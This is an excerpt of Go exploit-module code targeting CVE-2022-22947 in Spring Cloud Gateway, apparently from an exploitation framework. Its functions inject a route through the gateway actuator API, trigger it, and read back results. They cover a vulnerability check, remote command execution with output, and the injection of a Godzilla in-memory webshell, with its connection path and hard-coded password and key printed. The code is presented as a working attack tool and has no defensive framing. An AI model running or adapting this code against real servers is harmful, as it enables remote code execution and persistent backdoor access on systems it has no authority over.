...
func (self *Exp_CVE_2022_22947) Attack_getmsg1() (expResult exp_model.ExpResult) {
	// 默认配置
  ...
  "uri": "{{url}}"
	...
	route := self.MustGetStringParam("route")
	if route == "" {
		route = goutils.RandStr(7)
	}
	payload = strings.ReplaceAll(payload, "{{id}}", route)
	payload = strings.ReplaceAll(payload, "{{url}}", self.Params.BaseParam.Target)

	// 添加路由
	self.EchoSuccessMsg(fmt.Sprintf("add route %s.", route))
	headers.Set("Content-Type", "application/json")
	httpresp := self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/actuator/gateway/routes/"+route), payload, headers)
	if httpresp.Err != nil {
	...
	// 刷新路由
	self.EchoSuccessMsg("refresh all route.")
	httpresp = self.HttpPostWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/actuator/gateway/refresh"), "", self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	...
	self.EchoSuccessMsg("wait 5s......")
	time.Sleep(5 * time.Second)
	// 请求路由
	self.EchoSuccessMsg("request route.")
	httpresp = self.HttpGetWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/actuator/gateway/routes/"+route), self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	...
	if len(tmp) == 0 {
		...
		if strings.Contains(tmp[1], meta1+meta2) {
			self.EchoSuccessMsg("vul is exist")
		} else {
	...
	// 删除路由
	self.EchoSuccessMsg(fmt.Sprintf("delete route %s.", route))
	httpresp = self.HttpDeleteWithoutRedirect(goutils.AppendUri(self.Params.BaseParam.Target, "/actuator/gateway/routes/"+route), self.GetInitExpHeaders())
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
...
func (self *Exp_CVE_2022_22947) Attack_cmd1() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()
  ...
  "uri": "{{url}}"
	...
	if len(tmp) == 0 {
		...
		self.EchoSuccessMsg(fmt.Sprintf("cmd result: \n%s", result))
	}
...
func (self *Exp_CVE_2022_22947) Attack_upload1() (expResult exp_model.ExpResult) {

	// 默认配置
	headers := self.GetInitExpHeaders()
	memShell := "Godzilla"
	path := self.MustGetStringParam("path")
  ...
  "uri": "{{url}}"
	...
	if len(tmp) == 0 {
		...
		if strings.Contains(result, "inject-success") {
			...
			self.EchoSuccessMsg("任意路径，header头部插入Cookies字段输入命令即可")
		} else if strings.Contains(result, "ok") {
			expResult.Status = true
			self.EchoSuccessMsg("连接地址：" + self.Params.BaseParam.Target + "/" + path)
			self.EchoSuccessMsg("哥斯拉4.0.1 JAVA_AES_BASE64 密码2333 密钥2333")
		}
	}
...
func init() {
	exp_register.ExpStructRegister(&Exp_CVE_2022_22947{}, "exp_CVE_2022_22947.yml")
